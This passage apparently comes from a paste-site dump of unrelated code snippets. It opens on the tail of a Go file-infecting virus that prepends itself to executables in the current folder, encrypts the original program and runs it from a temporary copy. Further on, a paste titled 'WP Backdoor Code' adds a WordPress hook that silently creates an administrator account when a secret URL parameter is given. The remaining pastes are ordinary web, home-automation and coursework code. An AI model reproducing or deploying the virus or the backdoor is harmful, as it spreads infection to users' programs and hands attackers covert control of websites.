			return false //Invalid PE File Format
		}
	}
	if (f.Characteristics & 0x2000) == 0x2000 { //IMAGE_FILE_DLL signature
		return false //it's a DLL, OCX, CPL file, we want a EXE file
	}

	f.Close()
	return true //it is a valid EXE file

}

func CheckInfected(file string) bool {
	//a method by genetix, very handy
	_mark := ""=TMZ="" //infection mark
	fi, err := os.Open(file)
	check(err)
	myStat, err := fi.Stat()
	check(err)
	size := myStat.Size()

	buf := make([]byte, size)
	fi.Read(buf)
	fi.Close()
	var x int64
	for x = 1; x < size; x++ {
		if buf[x] == _mark[0] {
			var y int64
			for y = 1; y < int64(len(_mark)); y++ {
				if (x + y) >= size {
					break
				}
				if buf[x+y] != _mark[y] {
					break
				}
			}
			if y == int64(len(_mark)) {
				return true //infected!
			}
		}
	}
	return false //not infected
}

func Infect(file string) {

	dat, err := ioutil.ReadFile(file) //read host
	check(err)
	vir, err := os.Open(os.Args[0]) //read virus
	check(err)
	virbuf := make([]byte, 3039232)
	vir.Read(virbuf)

	encDat := Encrypt(dat) //encrypt host

	f, err := os.OpenFile(file, os.O_RDWR, 0666) //open host
	check(err)

	w := bufio.NewWriter(f)
	w.Write(virbuf) //write virus
	w.Write(encDat) //write encypted host
	w.Flush()       //make sure we are all set
	f.Close()
	vir.Close()

}

func RunHost() {

	hostbytes := Rnd(8) + "".exe"" //generate random name

	h, err := os.Create(hostbytes) //create tmp with above name
	check(err)

	infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
	check(err)
	allSZ := len(infected_data) //get file full size
	hostSZ := allSZ - 3039232   //calculate host size

	f, err := os.Open(os.Args[0]) //open host
	check(err)

	f.Seek(3039232, os.SEEK_SET) //go to host start

	hostBuf := make([]byte, hostSZ)
	f.Read(hostBuf) //read it

	plainHost := Decrypt(hostBuf) //decrypt host

	w := bufio.NewWriter(h)
	w.Write(plainHost) //write plain host to tmp file
	w.Flush()          //make sure we are all set
	h.Close()
	f.Close()

	os.Chmod(hostbytes, 0755) //give it proper permissions
	cmd := exec.Command(hostbytes)
	cmd.Start() //execute it
	err = cmd.Wait()
	os.Remove(hostbytes)
}

func Encrypt(toEnc []byte) []byte {

	key := ""SUPER_SECRET_KEY"" // 16 bytes!
	block, err := aes.NewCipher([]byte(key))
	check(err)

	// 16 bytes for AES-128, 24 bytes for AES-192, 32 bytes for AES-256
	ciphertext := []byte(""ASUPER_SECRET_IV"")
	iv := ciphertext[:aes.BlockSize] // const BlockSize = 16

	encrypter := cipher.NewCFBEncrypter(block, iv)

	encrypted := make([]byte, len(toEnc))
	encrypter.XORKeyStream(encrypted, toEnc)

	//fmt.Printf(""%s encrypted to %v\n"", toEnc, encrypted)
	return encrypted

}

func Decrypt(toDec []byte) []byte {

	key := ""SUPER_SECRET_KEY"" // 16 bytes
	block, err := aes.NewCipher([]byte(key))
	check(err)

	// 16 bytes for AES-128, 24 bytes for AES-192, 32 bytes for AES-256
	ciphertext := []byte(""ASUPER_SECRET_IV"")
	iv := ciphertext[:aes.BlockSize] // const BlockSize = 16

	decrypter := cipher.NewCFBDecrypter(block, iv) // simple

	decrypted := make([]byte, len(toDec))
	decrypter.XORKeyStream(decrypted, toDec)

	return decrypted
}

func Rnd(n int) string {

	rand.Seed(time.Now().UTC().UnixNano())
	var letters = []rune(""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)

}

func GetSz(file string) int64 {

	myHnd, err := os.Open(file)
	check(err)
	defer myHnd.Close()
	myStat, err := myHnd.Stat()
	check(err)
	mySZ := myStat.Size()
	myHnd.Close()
	return mySZ
}

func main() {

	virPath := os.Args[0]

	files, _ := ioutil.ReadDir(""."")
	for _, f := range files {
		if CheckPE(f.Name()) == true {
			if CheckInfected(f.Name()) == false {
				if !strings.Contains(virPath, f.Name()) {
					Infect(f.Name())
				}
			}
		}
	}

	if GetSz(os.Args[0]) > 3039232 {
		RunHost()
	} else {
		os.Exit(0)
	}
}"
MH4uXEi5,engineSetup,CaptainResu,Lua,Sunday 18th of June 2023 09:59:28 AM CDT,"
-- INCLUDE: engineSetup as startup
local filehandle0 = fs.open(""startup"", ""w"")
filehandle0.flush()
filehandle0.writeLine([==[local funs = require(""lib/funs"")

-- local settingsFile = fs.open(""conf.txt"", ""w"")
-- settingsFile.writeLine( ""startmotor="" );

funs.setupSettings({
    [""startmotor""] = """", 
    [""stressmeter""] = """",
    [""enginespeedmeter""] = """",
    [""outputspeedmeter""] = """",
    [""outputspeedcontroller""] = """"
})

textutils.serialise(funs.readSettings())

]==])
filehandle0.close()
-- END INCLUDE: engineSetup

-- INCLUDE: lib/funs as lib/funs.lua
local filehandle1 = fs.open(""lib/funs.lua"", ""w"")
filehandle1.flush()
filehandle1.writeLine([==[local funs = {}

function funs.split (inputstr, sep)
   if sep == nil then
      sep = ""%s""
   end
   local t={}
   for str in string.gmatch(inputstr, ""([^""..sep..""]+)"") do
      table.insert(t, str)
   end
   return t
end
function funs.readSettings()
    -- print(""read settings"")
    local settingsFile = fs.open(""config.txt"", ""r"")
    local settingsObject = {}
    local line = settingsFile.readLine()

    while line ~= nil do
        -- print(""Read: "" .. line)
        lineSplit = funs.split(line, ""="")
        local ls1 = lineSplit[1]
        local ls2 = lineSplit[2]
        if ls2 == nil then ls2 = """" end
        print(""Data: "" .. ls1 .. "": "" .. ls2)
        settingsObject[ls1] = ls2

        line = settingsFile.readLine()
    end 

    return settingsObject
end
function funs.setupSettings(settingsList)
    if fs.exists(""config.txt"") == false then
        local file = fs.open(""config.txt"", ""w"")
        file.flush()
        for name, dValue in pairs(settingsList) do
            file.writeLine(name .. ""="" .. dValue)
        end
        file.close()
    end
end

return funs
]==])
filehandle1.close()
-- END INCLUDE: lib/funs

shell.run(""startup"")
"
NpiQK8Vz,Untitled,pacho_the_python,CSS,Sunday 18th of June 2023 09:39:04 AM CDT,"@import url(https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap);

body {
    background-color: #ece9e9;
    display: flex;
    flex-direction: column;
    font-family: 'Inter', sans-serif;
    align-items: center;
}

header {
    width: 70%;
}

nav {
    display: flex;
    flex-direction: row;
    height: 80px;
    align-items: center;
    margin-bottom: 10px;
}

nav ul {
    display: flex;
    flex-direction: row;
    font-size: 16px;
}

nav ul li a {
    text-decoration: none;
    color: black;
}

.nav-links {
    gap: 40px;
    margin-right: auto;
    margin-left: 100px;
}

.nav-user {
    gap: 20px;
}

.last-li {
    margin-right: 130px;
}

.last-li a {
    background-color: #ADE2DF;
    padding: 12px;
    border-radius: 6px;
}

main {
    width: 70%;
}

.first-section {
    display: flex;
    flex-direction: column;
    align-items: center;
    background-color: #ADE2DF;
}

.first-section h1 {
    letter-spacing: 4px;
    font-size: 50px;
    margin: 70px 0 30px 0;
}

.first-section-btns {
    margin: 60px 0 90px 0;

}

.mobile {
    background-color: black;
    color: white;
    padding: 20px 30px;
    text-decoration: none;
    border-radius: 6px;
}

.first-section-btns .mobile:first-child {
    margin-right: 14px;
}

.second-section {
    display: flex;
    flex-direction: row;
    justify-content: center;
}

.second-section div {
    width: 26%;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    align-items: center;
    text-align: center;
    margin: 60px 0;
}

.second-section div:first-child, .second-section div:last-child {
    border-left: 1px solid lightgrey;
    border-right: 1px solid lightgrey;
}


.numbers{
    font-size: 34px;
    font-weight: 600;
    padding: 0 0 16px 0;
}

.second-section-content {
    padding-bottom: 60px;
}

.phone {
    display: flex;
    flex-direction: row;
    align-items: flex-start;
    justify-content: center;
    background-color: #ADE2DF;
}

.phone-img {
    border: 1px dashed #a4a3a3;
    width: 30%;
    height: 650px;
}

.phone-content {
    width: 34%;
    margin-top: 120px;
    margin-left: 80px;


}

.phone-content h2 {
    font-size: 30px;
    letter-spacing: 1px;
    margin-bottom: 20px;
}

.phone-content p {
    font-size: 18px;
    margin-bottom: 5px;
}

.phone-content .phone-content-second-p {
    margin-bottom: 30px;
    font-size: 14px;
}

.phone-content a {
    text-decoration: none;
    color: black;
    padding: 4px 0;
    border-bottom: 2px solid grey;
}

.pricing {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 30px;
    padding: 40px 0 50px 0;
}

.pricing a {
    text-decoration: none;
    padding: 4px 10px;
    border-radius: 6px;
    background-color: #ADE2DF;
    color: black;
}

.pricing h2 {
    font-size: 28px;
}

.offers {
    border: 1px solid #9b9999;
    border-radius: 10px;
    display: flex;
    flex-direction: row;
    overflow: hidden;
}

.offer-prices {
    width: 60%;
    height: 400px;
    display: flex;
    flex-direction: row;
    justify-content: center;
    background-color: white;
}

.offers-content {
    width: 40%;
    height: 400px;
    background-color:#ADE2DF;
    display: flex;
    flex-direction: column;
    align-self: flex-start;
    padding: 30px;
}

.card {
    margin-top: 20px;
    width: 35%;
    height: 90%;
    padding: 0 20px 0 20px;
    display: flex;
    flex-direction: column;
    align-items: flex-start;
}

.card h3 {
    align-self: center;
}

.offer-prices p {
    font-size: 12px;
}

.card h2 {
    padding: 30px 0;
}

.underline {
    width: 100%;
    height: 4px;
    border-top: 1px solid grey;
    margin-bottom: 30px;
}

.card a {
    margin-top: 20px;
    text-decoration: none;
    align-self: center;
    background-color: #ADE2DF;
    padding: 14px 62px;
    border-radius: 6px;
    color: black;
}

.card .get-plus {
    padding: 14px 80px;
}

.middle {
    border-right: 1px solid #BDBDBDFF;
    border-left: 1px solid #BDBDBDFF;
}

.offers-content h4 {
    text-align: center;
}

.bold-p {
    font-weight: bold;
    font-size: 18px;
    margin-bottom: 20px;
}

.offers-content a {
    text-decoration: none;
    color: white;
    background-color: black;
    text-align: center;
    padding: 14px 0;
    margin-top: 124px;
    border-radius: 6px;
}

.get-started {
    margin-top: 50px;
    display: flex;
    flex-direction: column;
    align-items: center;
    background-color: #ADE2DF;
}

.get-started h2 {
    margin-top: 50px;
    font-size: 46px;
}

.get-started-content {
    width: 40%;
    text-align: center;
}

footer {
    display: flex;
    flex-direction: row;
    align-items: center;
}

footer p {
    margin-left: 40px;
    margin-right: auto;
}

footer ul {
    display: flex;
    flex-direction: row;
    align-items: center;
    gap: 10px;
    margin-right: 40px;
}

footer ul li a {
    text-decoration: none;
    color: black;
}"
2QYCJPDy,Untitled,pacho_the_python,HTML,Sunday 18th of June 2023 09:38:40 AM CDT,"<!DOCTYPE html>
<html lang=""en"">

<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <link rel=""stylesheet"" href=""reset.css"">

    <link rel=""stylesheet"" href=""https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"">
    <link rel=""stylesheet"" href=""styles.css"">
    <link rel=""stylesheet""
          href=""https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap"">

    <title>Document</title>
</head>

<body>
<header>
    <nav>
        <ul role=""list"" class=""nav-links"">
            <li><a href=""#"">Features</a></li>
            <li><a href=""#"">How it's work</a></li>
            <li><a href=""#"">Prices</a></li>
            <li><a href=""#"">Contact</a></li>
        </ul>

        <ul role=""list"" class=""nav-user"">
            <li><a href=""#"">Log in</a></li>
            <li class=""last-li""><a href=""#"">Sign up</a></li>
        </ul>
    </nav>
</header>

<main>
    <section class=""first-section"">
        <h1>Finbest is a clean, easy to use, finance app.</h1>
        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt.</p>
        <div class=""first-section-btns"">
            <a class=""mobile"" href=""#""><i class=""fa-brands fa-apple""></i> Download for iOS</a>
            <a class=""mobile"" href=""#""><i class=""fa-brands fa-android""></i> Download for Android</a>
        </div>
    </section>

    <section class=""second-section"">
        <div>
            <p class=""numbers"">200k</p>
            <p class=""second-section-content"">Lorem ipsum dolor sit ametconsectetur adipiscing</p>
        </div>
        <div>
            <p class=""numbers"">$3,5 billions</p>
            <p class=""second-section-content"">Lorem ipsum dolor sit ametconsectetur adipiscing</p>
        </div>
        <div>
            <p class=""numbers"">10.000 +</p>
            <p class=""second-section-content"">Lorem ipsum dolor sit ametconsectetur adipiscing</p>
        </div>
    </section>

    <section class=""phone"">
        <div class=""phone-img"">
            <img src=""images/group%201277.svg"" alt=""phone image"">
        </div>

        <div class=""phone-content"">
            <h2>Everything you get with Finbest</h2>
            <p><strong>Lorem ipsum dolor sit amet, consectetur</strong></p>
            <p class=""phone-content-second-p"">Sed do eiusmod tempor incididunt ut labore et dolore magna aliquat enim ad minim veniam, quis nostrud</p>
            <p><strong>Lorem ipsum dolor sit amet, consectetur</strong></p>
            <p class=""phone-content-second-p"">Sed do eiusmod tempor incididunt ut labore et dolore</p>
            <a href=""#"">Explore pricing plans <i class=""fa-solid fa-arrow-right""></i></a>
        </div>
    </section>

    <section class=""pricing"">
        <a href=""#"">Pricing plans</a>
        <h2>No setup cost or hidden fees.</h2>
    </section>

    <section class=""offers"">
        <div class=""offer-prices"">
            <div class=""card"">
                <h3>Standard</h3>
                <p>Sed ut perspiciatis unde omnis iste natus error sit.</p>
                <h2>Free</h2>
                <div class=""underline""></div>
                <p><i class=""fa-solid fa-check""></i> Sed ut perspiciatis unde</p>
                <p><i class=""fa-solid fa-check""></i> Quis nostrud exercitation ulla</p>
                <p><i class=""fa-solid fa-check""></i> Duis aute irure dolor intuit</p>
                <p><i class=""fa-solid fa-check""></i> Voluptas sit aspernatur aut odit</p>
                <p><i class=""fa-solid fa-check""></i> Corporis suscipit laboriosam</p>
                <a href=""#"">Get Standard</a>
            </div>
            <div class=""card middle"">
                <h3>Plus</h3>
                <p>Sed ut perspiciatis unde omnis iste natus error sit.</p>
                <h2>$8 /month</h2>
                <div class=""underline""></div>
                <p><i class=""fa-solid fa-check""></i> Sed ut perspiciatis unde</p>
                <p><i class=""fa-solid fa-check""></i> Quis nostrud exercitation ulla</p>
                <p><i class=""fa-solid fa-check""></i> Duis aute irure dolor intuit</p>
                <p><i class=""fa-solid fa-check""></i> Voluptas sit aspernatur aut odit</p>
                <p><i class=""fa-solid fa-check""></i> Corporis suscipit laboriosam</p>
                <a class=""get-plus"" href=""#"">Get Plus</a>
            </div>
            <div class=""card"">
                <h3>Premium</h3>
                <p>Sed ut perspiciatis unde omnis iste natus error sit.</p>
                <h2>$16 /month</h2>
                <div class=""underline""></div>
                <p><i class=""fa-solid fa-check""></i> Sed ut perspiciatis unde</p>
                <p><i class=""fa-solid fa-check""></i> Quis nostrud exercitation ulla</p>
                <p><i class=""fa-solid fa-check""></i> Duis aute irure dolor intuit</p>
                <p><i class=""fa-solid fa-check""></i> Voluptas sit aspernatur aut odit</p>
                <p><i class=""fa-solid fa-check""></i> Corporis suscipit laboriosam</p>
                <a href=""#"">Get Premium</a>
            </div>
        </div>
        <div class=""offers-content"">
            <h4>Expand</h4>
            <p class=""bold-p"">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt.</p>
            <p><i class=""fa-solid fa-check""></i> Sed ut perspiciatis unde</p>
            <p><i class=""fa-solid fa-check""></i> Sed ut perspiciatis unde</p>
            <p><i class=""fa-solid fa-check""></i> Duis aute irure dolor intuit</p>
            <a href=""#"">Contact us</a>
        </div>
    </section>

    <section class=""get-started"">
        <div class=""get-started-content"">
            <h2>Get started with finbest now!</h2>

            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore magna.</p>
        </div>
        <div class=""first-section-btns"">
            <a class=""mobile"" href=""#""><i class=""fa-brands fa-apple""></i> Download for iOS</a>
            <a class=""mobile"" href=""#""><i class=""fa-brands fa-android""></i> Download for Android</a>
        </div>
    </section>

    <footer>
        <p>© 2023, All Rights Reserved.</p>
        <ul role=""list"">
            <li><a href=""#""><i class=""fa-brands fa-twitter""></i></a></li>
            <li><a href=""#""><i class=""fa-brands fa-facebook""></i></a></li>
            <li><a href=""#""><i class=""fa-brands fa-instagram""></i></a></li>
        </ul>
    </footer>
</main>


</body>"
Fw9J3y8u,Untitled,john_smith_1488,Python,Sunday 18th of June 2023 09:36:06 AM CDT,"def get_load_stat(settings: Settings):
	db_client = DbInterfaceFactory.create_interface(settings)
	query_client = QueryFactory.create_interface(settings)
	measurement_dict = query_client.get_load_statistics_measurements()
	raw_df = pd.DataFrame()
	load_stat = {}
	for measurement, data in measurement_dict.items():
		for data in metric[""data""]:
			metric_name = data['metric']
			
			all_steps_load_stat_tmp_df = get_all_steps_for_load_stat(settings, db_client, query_client, measurement, metric_name)
			if all_steps_load_stat_tmp_df.empty:
				continue
			
			raw_df = raw_df.append(all_steps_load_stat_tmp_df, ignore_index=True)
			
			load_stat_pivot_table = get_load_stat_metric_pivot_table(settings, metric_name, all_steps_load_stat_tmp_df)
			if load_stat_pivot_table:
				load_stat[measurement][metric_name] = load_stat_pivot_table
		
		if len(load_stat[measurement]) == 0:
			del load_stat[measurement]
	db_client.disconnect()	

	return raw_df, load_stat


def get_all_steps_for_load_stat(settings, db_client, query_client, measurement, metric_name) -> pd.DataFrame:
	df_for_all_steps = pd.DataFrame()
	for step in settings.steps:
		start = step[start]
		stop = step[stop]

		load_stat_sql = query_client.get_load_stat_method(start, stop, metric_name)
		load_stat_result_set = db_client.get_raw_data(load_stat_sql)

		tmp_df = get_df_from_load_stat_result_set(load_stat_result_set)
		if tmp_df.empty:
			continue
		
		df_for_all_steps = df_for_all_steps.append(tmp_df, ignore_index=True)
	
	return df_for_all_steps


def get_load_stat_metric_pivot_table(settings, metric_name, all_steps_load_stat_tmp_df) -> pd.DataFrame:
	columns = ['step', 'percent']
	if 'step_name' in all_steps_load_stat_tmp_df:
		columns.insert(1, 'step_name')
	
	table = pd.pivot_table(all_steps_load_stat_tmp_df, value='value', index='index', columns=columns)
	
	if table.empty:
		return
	
	return table"
9nCfy2Ua,test,calas,YAML,Sunday 18th of June 2023 09:08:39 AM CDT,"type: custom:button-card
name: Power Control
variables:
  power_meter: sensor.shellyem_b168e7_channel_1_power
show_icon: false
aspect_ratio: 1/1
styles:
  card:
    - background-color: '#333'
    - border-radius: 20px
    - padding: 8px
  name:
    - font-weight: bold
    - font-size: clamp(30px, 1vw, 35px)
    - align-self: start
    - justify-self: center
    - padding-top: 30px
    - padding-bottom: 13px
    - padding-left: 10px
    - letter-spacing: '-2.0px'
    - color: var(--secondary-text-color)
  custom_fields:
    watt:
      - position: absolute
      - top: 4%
      - padding-left: 12px
      - justify-self: center
    logo:
      - position: absolute
      - top: 3%
      - width: calc(20% - 20px)
      - padding-right: 250px
      - justify-self: center
    ultimo_disp:
      - position: absolute
      - top: 20%
      - justify-self: start
      - padding-left: 5px
    graph:
      - position: absolute
      - top: 27%
      - margin-right: 80px
      - padding-right: 20px
      - justify-self: center
      - width: calc(80% - 50px)
    lista:
      - position: absolute
      - top: 87%
      - justify-self: start
      - width: calc(25% - 40px)
      - max-width: 100%
      - flex-basis: 100%
custom_fields:
  watt:
    card:
      type: custom:button-card
      name: |
        [[[
            return 'Instantaneo '+ states[variables.power_meter].state + 'W';
        ]]]
      styles:
        card:
          - background-color: transparent
          - border-style: none
        name:
          - font-color: var(--secondary-text-color)
          - font-size: clamp(12px, 1vw, 18px)
  logo:
    card:
      type: custom:button-card
      color: transparent
      entity: automation.power_control
      show_name: eurt
      name: |
        [[[
         if (states['automation.power_control'].state == 'on') return ""Attivo"";
         else return ""Spento"";
        ]]]
      icon: |
        [[[
         if (states['automation.power_control'].state == 'on') return ""mdi:head-flash"";
         else return ""mdi:hand-back-right-off"";
        ]]]
      show_entity_picture: false
      styles:
        card:
          - background-color: transparent
          - border-style: none
        name:
          - font-weight: bold
          - font-size: 15px
        icon:
          - width: calc(90% - 20px)
          - height: calc(95% - 15px)
          - color: |
              [[[
                 if (states['automation.power_control'].state == 'on') return ""white   "";
                 else return ""#252525"";
               ]]]
          - padding: 6px
          - border-radius: 30%
          - background-color: |
              [[[
                 if (states['automation.power_control'].state == 'on') return ""OliveDrab   "";
                 else return ""#606060"";
               ]]]
      tap_action:
        action: call-service
        service: automation.toggle
        service_data:
          entity_id: automation.power_control
  ultimo_disp:
    card:
      type: custom:button-card
      entity: sensor.ultimo_dispositivo_acceso
      layout: name_state
      name: Ultimo disp. acceso
      show_icon: false
      show_state: true
      styles:
        card:
          - background-color: transparent
        name:
          - font-color: var(--secondary-text-color)
          - font-size: clamp(7px, 0.8vw, 14px)
  graph:
    card:
      type: custom:apexcharts-card
      graph_span: 3h
      header:
        show: true
        show_states: false
        colorize_states: true
      series:
        - entity: '[[[return variables.power_meter ]]]'
          stroke_width: 2
          show:
            extremas: true
      card_mod:
        style: |
          ha-card {
            border: 0px;
            background: none;
            width: 130%;
            padding-right: 10px
            }
  lista:
    card:
      type: custom:button-card
      icon: mdi:view-list-outline
      show_state: false
      show_icon: true
      show_name: false
      styles:
        card:
          - background-color: '#4B5975'
          - border-radius: 18px
          - border-style: none
          - box-shadow: 0px 5px 10px 0px rgba(0, 0, 0, 0.2)
        icon:
          - width: calc(60% - 5px)
          - color: white
          - align-self: start
          - text-align: start
          - padding: 0px
"
6eir49cb,chars.lua,zydeco,Lua,Sunday 18th of June 2023 09:00:07 AM CDT,"print(""  0123456789abcdef"")
for hi = 0, 15 do
    local line = string.format(""%x "", hi)
    for lo = 0, 15 do
        local letter = string.char(hi * 16 + lo)
        if letter == ""\n"" then
            letter = "" ""
        end
        line = line .. letter
    end
    print(line)
end"
eRei3An9,WP Backdoor Code,Tariqul_Islam,JavaScript,Sunday 18th of June 2023 08:58:43 AM CDT,"add_action( 'wp_head', 'my_wp_backdoor' ); 

function my_wp_backdoor() {
 	if ( md5( $_GET['backdoor'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) { 
		require( 'wp-includes/registration.php' ); 
		if ( !username_exists( 'username' ) ) { 
			$user_id = wp_create_user( 'username', 'pass ); 
			$user = new WP_User( $user_id ); 
			$user->set_role( 'administrator' ); 
			} 
		} 
	}
"
EcEGK8Sa,Untitled,ph4x35ccb,Python,Sunday 18th of June 2023 08:51:06 AM CDT,"from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import os
import time
import requests

##API
#CHAVE    I28hd85vK62nxP6eU7iBpqYlWm******
agent = {""User-Agent"": 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36'}
api = requests.get(""https://editacodigo.com.br/index/api-whatsapp/I28hd85vK62nxP6eU7iBp*******"" ,  headers=agent)
time.sleep(1)
api = api.text
api = api.split("".n."")
bolinha_notificacao = api[3].strip()
contato_cliente = api[4].strip()
caixa_msg = api[5].strip()
msg_cliente = api[6].strip()
caixa_msg2 = api[7].strip()
caixa_pesquisa = api[8].strip()
##############################

dir_path = os.getcwd()
chrome_options2 = Options()
chrome_options2.add_argument(r""user-data-dir="" +  dir_path + ""profile/zap"")
driver = webdriver.Chrome(options=chrome_options2);
driver.get('https://web.whatsapp.com')
time.sleep(30)

def bot():
	try:
		bolinha = driver.find_element(By.CLASS_NAME,bolinha_notificacao)
		bolinha = driver.find_elements(By.CLASS_NAME,bolinha_notificacao)
		clica_bolinha = bolinha[-1]
		click_bolinha = webdriver.common.action_chains.ActionChains(driver)
		click_bolinha.move_to_element_whit_offset(clica_bolinha,0,-20)
		click_bolinha.click()
		click_bolinha.perform()
		click_bolinha.click()
		click_bolinha.perform()
	except:
		print('OLA')

while True:
	bot()
"
VNFqu49q,Untitled,Reza_16,C++,Sunday 18th of June 2023 08:37:15 AM CDT,"#include <bits/stdc++.h>
using namespace std;
typedef long long ll;
ll fun(vector<pair<double, pair<ll, double>>> vp)
{
    vector<double> execution;
    double sum = 0;
    for (auto i : vp)
        execution.push_back(i.second.second), sum += i.second.second;
    double mean = sum / (vp.size());
    double median;
    if (vp.size() % 2)
    {
        median = execution[vp.size() / 2];
    }
    else
        median = (execution[vp.size() / 2] + execution[vp.size() / 2 - 1]) / 2.0;
    return (ll)round(sqrt((median * mean) / 2.0));
}  

void solve()
{
    ll n;
    cout << ""Number of Input: "";
    cin >> n;
    vector<pair<double, pair<ll, double>>> vp, dp;
    for (int i = 0; i < n; i++)
    {
        ll p, a, e;
        cout << ""Process :"";
        cin >> p;
        cout << ""Arrival :"";
        cin >> a;
        cout << ""Execution time :"";
        cin >> e;
        vp.push_back({a, {p, e}});
    }
    dp = vp;

    ll tq = fun(vp);
    sort(vp.begin(), vp.end());
    ll t = vp[0].first;
    cout << t << ' ';
    double finalEx[n + 1];
    while (1)
    {
        for (int i = 0; i < (int)vp.size(); i++)
        {
            double x = min(double(tq), vp[i].second.second);
            cout << ""P"" << vp[i].second.first << ' ' << t + x << ' ';
            finalEx[vp[i].second.first] = t + x;
            vp[i].second.second = max(double(0), vp[i].second.second - tq);
            if (vp[i].second.second == 0)
                vp.erase(vp.begin() + i);
            t += x;
        }
        if (vp.empty())
        {
            break;
        }
        sort(vp.begin(), vp.end());
        tq = fun(vp);
    }
    double waiting[n + 1] = {0}, turnaroun[n + 1] = {0};
    for (auto i : dp)
        waiting[i.second.first] = finalEx[i.second.first] - i.second.second - i.first, turnaroun[i.second.first] = finalEx[i.second.first] - i.second.first;

    double w = 0, tt = 0;
    cout << endl;
    for (int i = 1; i <= n; i++)
        w += waiting[i], tt += turnaroun[i];
    cout << ""Average waiting time :"" << w / n << endl;
    cout << ""Average turnaround time :"" << tt / n << endl;
}

int main()
{
    
    ll tc = 1;
    for (ll t = 1; t <= tc; t++)
    {
        solve();
    }
    return 0;
}"
wei7qZFM,邀您一起看：聚影外挂,xiaomianao666,JavaScript,Sunday 18th of June 2023 08:02:09 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥聚影外挂@@
AQa95nty,Get Sensor from DB,mayerm001,PHP,Sunday 18th of June 2023 07:55:32 AM CDT,"float getActiveSensorTemperature(String serverName)
{
    WiFiClient wclient;
    HTTPClient http;
    String json, timestamp, uname = """";
    float temp = -1;
    char result[64];
    DynamicJsonDocument document(1024);   
    http.begin(wclient, serverName);
    http.addHeader(""Content-Type"", ""application/text"");                                   
    int httpResponseCode = http.GET();
    if (httpResponseCode > 0) {
        json = http.getString();
        deserializeJson(document, json);
        JsonArray array = document.as<JsonArray>();
        temp = document[0][""temperature""].as<float>();
        timestamp = document[0][""timestamp""].as<String>();
        uname = document[0][""uname""].as<String>();
        Serial.print(getTimestamp() + "" : Room temperature (from database): ""); Serial.print(temp); Serial.println("" °C - ("" + uname + "" - "" + timestamp + "")"");        
    } else
        Serial.println(getTimestamp() + "" : No response "" + httpResponseCode);
    http.end(); 
    return temp;
}"
3TUQ5V03,dem22.n27,Korotkodul,Python,Sunday 18th of June 2023 07:54:47 AM CDT,"f = open('27_A.txt')
#f = open('tst.txt')
n = int(f.readline())
a = [int(i) for i in f.readlines()]
f.close()
a = [0] + a
n += 1
pf = [0] * n

for i in range(1, n):
    pf[i] = pf[i-1] + a[i]

mxs = 0
ansl = 0

for i in range(n):
    for j in range(i+1,n):
        nows = pf[j] - pf[i]
        if nows % 43 == 0:
            if nows > mxs:
                mxs = nows
                ansl = j - i
            elif nows == mxs:
                if j - i < ansl:
                    ansl = j - i
print(ansl, mxs)
print(a)
print(pf)
""""""
3 258
[0, 43, 43, 1, 129, 42, 87]
[0, 43, 86, 87, 216, 258, 345]
""""""
"
E5ic565t,dem22.n26,Korotkodul,Python,Sunday 18th of June 2023 07:54:33 AM CDT,"#f = open('tst.txt')
f = open('26.txt')
s, n = map(int, f.readline().split())
print(n,s)
a = [int(i) for i in f.readlines()]
f.close()

#print(a)
print(len(a))

n = len(a)
pf = [0] * n
a = sorted(a)

print(a)

pf[0] = a[0]
for i in range(1, n):
    pf[i] = pf[i-1] + a[i]


#for i in range(n):
#    print(i, a[i], pf[i])
    
    
k = 0


for i in range(n):
    if pf[i] > s:
        k = i - 2
        break

print(""k = "", k)
print(pf[k])
    
tot = pf[k]
mx = a[k + 1]
for i in range(n - 1, 0, -1):
    if a[i] + pf[k] <= s:
        tot += a[i]
        mx = a[i]
        break
print(k + 2, mx)
"
uFJw3XnA,linak,stofakiller,YAML,Sunday 18th of June 2023 07:43:14 AM CDT,"esphome:
  name: ""bedcontrol""
  friendly_name: ""bedcontrol""

esp32:
  board: esp32dev
  framework:
    type: arduino

# Enable logging
logger:
#  level: verbose
  baud_rate: 0

# Enable Home Assistant API
api:
  reboot_timeout: 120s
ota:

wifi:
  ssid: !secret wifi_ssid
  password: !secret wifi_password
  reboot_timeout: 120s
#  fast_connect: true
  # Enable fallback hotspot (captive portal) in case wifi connection fails
  ap:
    ssid: ""Bedcontrol Fallback Hotspot""
    password: ""stofakiller""

captive_portal:

esp32_ble_tracker:

ble_client:
  - mac_address: EE:9C:03:30:7C:02 # Jans Seng
    id: janseng
    on_connect:
      then:
        - lambda: |-
            ESP_LOGD(""ble_client_lambda"", ""Connected to Jans Seng"");
        - switch.turn_on: jans_seng_connected
#        - lambda: |-
#            id(jan_head_height).update();
#        - lambda: |-
#            id(jan_feet_height).update();
    on_disconnect:
      then:
        - lambda: |-
            ESP_LOGD(""ble_client_lambda"", ""Disconnected from Jans Seng"");
        - switch.turn_off: jans_seng_connected

  - mac_address: CB:B9:5F:F4:66:6C # Sofies seng
    id: sofieseng
    on_connect:
      then:
        - lambda: |-
            ESP_LOGD(""ble_client_lambda"", ""Connected to Sofies Seng"");
        - switch.turn_on: sofies_seng_connected
#        - lambda: |-
#            id(sofie_head_height).update();
#        - lambda: |-
#            id(sofie_feet_height).update();

    on_disconnect:
      then:
        - lambda: |-
